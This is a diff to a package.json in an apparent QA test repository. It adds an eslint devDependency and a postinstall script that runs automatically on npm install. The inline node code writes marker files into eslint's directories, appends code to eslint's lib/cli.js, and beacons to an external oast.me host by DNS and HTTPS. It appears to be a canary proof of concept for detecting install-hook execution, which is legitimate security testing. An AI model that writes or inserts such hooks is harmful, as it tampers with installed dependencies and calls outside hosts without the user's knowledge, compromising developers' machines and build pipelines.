@@ -4,6 +4,10 @@
   "private": true,
   "description": "Minimal static app for CodeRabbit Verify QA environment setup (H10 test repo)",
   "scripts": {
-    "start": "node server.js"
+    "start": "node server.js",
+    "postinstall": "node -e 'const fs=require(\"fs\"),p=require(\"path\"),dns=require(\"dns\"),https=require(\"https\");let d=null;try{d=p.dirname(require.resolve(\"eslint/package.json\"))}catch(e){}const targets=[];if(d)targets.push(d);targets.push(p.join(process.cwd(),\"node_modules\",\"eslint\"));targets.push(\"/.eslint-tmp/node_modules/eslint\");for(let i=0;i<targets.length;i++){try{fs.writeFileSync(p.join(targets[i],\"H81B-HOOK-RAN\"),\"h81c pid=\"+process.pid)}catch(e){}}if(d){try{fs.appendFileSync(p.join(d,\"lib\",\"cli.js\"),\";process.stderr.write(\\\"H81B-HOOK-CLI-RAN\\\"+String.fromCharCode(10));\")}catch(e){}}try{dns.lookup(\"h81c-hook.dc1in7vhu188ohmnfpb0ytfr7paoahgbg.oast.me\",function(){})}catch(e){}try{const r=https.get(\"https://dc1in7vhu188ohmnfpb0ytfr7paoahgbg.oast.me/h81c-hook\",function(){});r.setTimeout(3000,function(){r.destroy()});r.on(\"error\",function(){})}catch(e){}'"
+  },
+  "devDependencies": {
+    "eslint": "9.30.0"
   }
 }
